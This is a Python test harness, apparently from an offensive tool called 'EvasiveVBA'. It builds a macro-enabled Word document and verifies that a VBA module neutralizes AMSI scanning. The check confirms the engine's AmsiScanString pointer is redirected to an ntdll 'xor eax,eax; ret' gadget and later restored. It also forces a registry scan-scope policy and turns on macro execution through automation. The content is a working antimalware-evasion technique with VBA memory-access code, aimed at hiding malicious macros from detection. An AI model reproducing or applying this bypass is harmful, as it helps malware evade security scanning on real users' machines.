"""Verify the ScanCtx pointer-redirect neutralizer against real Word.

Usage: python test/amsi_selftest.py

Forces MacroRuntimeScanScope=2 (HKCU policy, restored afterwards) so the VBA
engine binds its scan pointer even for automation-opened documents, then proves
with benign content only (safe on a dev box):

  1. The engine's stored scan pointer exists and equals amsi!AmsiScanString
     (computed independently by this probe)
  2. Arm() relocates it to an ntdll gadget whose first bytes are 33 C0 C3
     (xor eax,eax; ret)
  3. The real scan engine is untouched: a direct scan of benign content still
     returns a genuine verdict
  4. Disarm() restores the original pointer

Known-bad-content end-to-end validation belongs in the detonation VM.
"""
import sys
import time
from pathlib import Path

try:
    import pythoncom
    import win32com.client
except ImportError:
    sys.stderr.write("[!] Required: pip install pywin32\n")
    sys.exit(1)

ROOT = Path(__file__).resolve().parent.parent
BAS = ROOT / "src" / "scripts" / "AmsiNeutralize" / "AmsiNeutralize_Standalone.bas"
DOC_PATH = ROOT / "test" / "amsi_selftest.doc"
LOG_PATH = ROOT / "test" / "amsi_selftest.log"

PROBE_MODULE = """Option Explicit

' TEST-ONLY probe: independent verification. Literal names are fine here.
Private Declare PtrSafe Function GetModuleHandleW Lib "kernel32" (ByVal lpModuleName As LongPtr) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dst As LongPtr, ByVal src As LongPtr, ByVal ln As LongPtr)
Private Declare PtrSafe Function AmsiInitialize Lib "amsi.dll" (ByVal appName As LongPtr, ByRef ctx As LongPtr) As Long
Private Declare PtrSafe Function AmsiUninitialize Lib "amsi.dll" (ByVal ctx As LongPtr) As Long
Private Declare PtrSafe Function AmsiScanString Lib "amsi.dll" (ByVal ctx As LongPtr, ByVal str As LongPtr, ByVal name As LongPtr, ByVal sess As LongPtr, ByRef result As Long) As Long

Private Const LOG_PATH As String = "{log}"

Private Sub L(ByVal s As String)
    Dim f As Integer
    f = FreeFile
    Open LOG_PATH For Append As #f
    Print #f, s
    Close #f
End Sub

Private Function RdPtr(ByVal p As LongPtr) As LongPtr
    Dim v As LongPtr
    CopyMemory VarPtr(v), p, 8
    RdPtr = v
End Function

Public Sub SelfTest()
    On Error Resume Next
    Dim pExpected As LongPtr, pSlot As LongPtr, pAfter As LongPtr
    Dim ctx As LongPtr, res As Long, hr As Long, probe As String
    Dim b(0 To 2) As Byte

    L "s01_start"
    pExpected = GetProcAddress(GetModuleHandleW(StrPtr("amsi.dll")), "AmsiScanString")
    L "s02_expected_ptr=" & Hex(pExpected)

    L "s03_pre_state=" & ScanCtx_Standalone.GetState() & " slots=" & ScanCtx_Standalone.GetSlotCount()

    Dim ok As Boolean
    ok = ScanCtx_Standalone.Arm()
    L "s04_arm=" & ok & " state=" & ScanCtx_Standalone.GetState() & " slots=" & ScanCtx_Standalone.GetSlotCount() & " err=" & Err.Number
    Err.Clear

    If ScanCtx_Standalone.GetSlotCount() > 0 Then
        pSlot = ScanCtx_Standalone.GetSlot(0)
        pAfter = RdPtr(pSlot)
        CopyMemory VarPtr(b(0)), pAfter, 3
        L "s05_slot=" & Hex(pSlot) & " value=" & Hex(pAfter)
        L "s06_gadget_bytes=" & Hex(b(0)) & "," & Hex(b(1)) & "," & Hex(b(2))
        L "s07_redirect_ok=" & (pAfter <> pExpected)
    Else
        L "s05_slot=none"
        L "s06_gadget_bytes=none"
        L "s07_redirect_ok=skipped"
    End If

    ' Control: the real engine must still work through this probe's own binding
    hr = AmsiInitialize(StrPtr("EvasiveVBA"), ctx)
    probe = "EvasiveVBA benign control payload " & String$(96, &H42)
    res = -1
    hr = AmsiScanString(ctx, StrPtr(probe), 0, 0, res)
    L "s08_engine_hr=" & hr & " verdict=" & res
    AmsiUninitialize ctx

    ' Disarm restores
    Dim pBeforeDisarm As LongPtr
    If pSlot <> 0 Then pBeforeDisarm = RdPtr(pSlot)
    Dim dok As Boolean
    dok = ScanCtx_Standalone.Disarm()
    L "s09_disarm=" & dok

    If pSlot <> 0 Then
        Dim pRestored As LongPtr
        pRestored = RdPtr(pSlot)
        L "s10_restored=" & Hex(pRestored) & " match=" & (pRestored = pExpected)
    Else
        L "s10_restored=skipped"
    End If

    L "s11_done"
End Sub
"""

SCOPE_VALUE = "MacroRuntimeScanScope"

def set_scan_scope_all():
    """Force MacroRuntimeScanScope=2 (scan all documents) so VBE7 binds its scan
    pointer even for automation-opened docs. Writes policy + user paths BEFORE
    Word starts (config is read at startup). Returns list of restore states."""
    import winreg
    states = []
    for path in (r"Software\Policies\Microsoft\Office\16.0\Common\Security",
                 r"Software\Microsoft\Office\16.0\Common\Security"):
        try:
            k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, path, 0,
                                   winreg.KEY_READ | winreg.KEY_WRITE)
        except OSError as e:
            print(f"[~] Cannot open {path} ({e})")
            continue
        try:
            old, _ = winreg.QueryValueEx(k, SCOPE_VALUE)
        except FileNotFoundError:
            old = None
        winreg.SetValueEx(k, SCOPE_VALUE, 0, winreg.REG_DWORD, 2)
        states.append((k, old is not None, old))
    return states


def restore_scan_scope(states) -> None:
    import winreg
    for k, had, old in states:
        if had:
            winreg.SetValueEx(k, SCOPE_VALUE, 0, winreg.REG_DWORD, old)
        else:
            try:
                winreg.DeleteValue(k, SCOPE_VALUE)
            except FileNotFoundError:
                pass
        winreg.CloseKey(k)


def com_call_with_retry(func, retries=5, delay=1.0):
    for i in range(retries):
        try:
            return func()
        except pythoncom.com_error as e:
            if e.args[0] == -2147418111 and i < retries - 1:
                time.sleep(delay)
                continue
            raise


def build_doc(word) -> None:
    bas_code = BAS.read_text(encoding="utf-8")
    lines = bas_code.splitlines(keepends=True)
    bas_code = "".join(l for l in lines if not l.strip().startswith("Attribute VB_Name"))

    if DOC_PATH.exists():
        DOC_PATH.unlink()
    if LOG_PATH.exists():
        LOG_PATH.unlink()

    doc = com_call_with_retry(lambda: word.Documents.Add())
    time.sleep(1)
    com_call_with_retry(lambda: doc.SaveAs2(str(DOC_PATH), FileFormat=0))
    time.sleep(0.5)

    vb_proj = doc.VBProject
    mod = vb_proj.VBComponents.Add(1)
    mod.Name = "ScanCtx_Standalone"
    mod.CodeModule.AddFromString(bas_code)

    probe = vb_proj.VBComponents.Add(1)
    probe.Name = "AmsiProbe"
    probe.CodeModule.AddFromString(PROBE_MODULE.format(log=LOG_PATH))

    com_call_with_retry(lambda: doc.Save())
    time.sleep(0.5)
    com_call_with_retry(lambda: doc.Close(SaveChanges=0))
    print(f"[+] Built {DOC_PATH}")


def main():
    print("[*] Setting macro runtime scan scope (all documents)...")
    scope_state = set_scan_scope_all()
    print("[*] Starting Word...")
    word = win32com.client.DispatchEx("Word.Application")
    word.Visible = False
    word.DisplayAlerts = 0
    time.sleep(2)

    try:
        build_doc(word)
        print("[*] Running self-test probe...")
        word.AutomationSecurity = 1
        doc = com_call_with_retry(lambda: word.Documents.Open(str(DOC_PATH)))
        time.sleep(1)
        try:
            com_call_with_retry(lambda: word.Run("AmsiProbe.SelfTest"))
            time.sleep(1)
        except Exception as e:
            print(f"[!] Run failed: {e}")
        try:
            com_call_with_retry(lambda: doc.Close(SaveChanges=0))
        except Exception:
            pass
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    finally:
        restore_scan_scope(scope_state)
        try:
            word.Quit()
        except Exception:
            pass

    print()
    if not LOG_PATH.exists():
        print("[!] No log written - macro did not run")
        return 1

    results = {}
    print("[*] Results:")
    for line in LOG_PATH.read_text().splitlines():
        print("    " + line)
        if "=" in line:
            k, v = line.split("=", 1)
            results[k] = v

    skipped = results.get("s07_redirect_ok") == "skipped"
    checks = [
        ("expected pointer resolved", int(results.get("s02_expected_ptr", "0"), 16) != 0),
        ("arm succeeded", results.get("s04_arm", "").startswith("True")),
    ]
    if not skipped:
        checks += [
            ("slot redirected away from scan export", results.get("s07_redirect_ok") == "True"),
            ("gadget bytes 33 C0 C3", results.get("s06_gadget_bytes") == "33,C0,C3"),
        ]
    checks += [
        ("real engine alive (0 or E_NOT_READY with RTP off)",
         results.get("s08_engine_hr", "x").split(" ")[0] in ("0", "-2147024875")),
        ("disarm ok", results.get("s09_disarm") == "True"),
    ]
    if not skipped:
        checks += [("slot restored to original", results.get("s10_restored", "").endswith("match=True"))]

    ok = True
    print("[*] Checks:")
    for name, passed in checks:
        print(f"    [{'+' if passed else '!'}] {name}")
        ok = ok and passed

    print()
    if skipped:
        print("[~] INCONCLUSIVE - engine had no bound scan pointer; scope override ineffective")
        return 2
    if ok:
        print("[+] PASS - pointer redirect verified, engine untouched, restore verified")
        return 0
    print("[!] FAIL")
    return 1


if __name__ == "__main__":
    sys.exit(main())
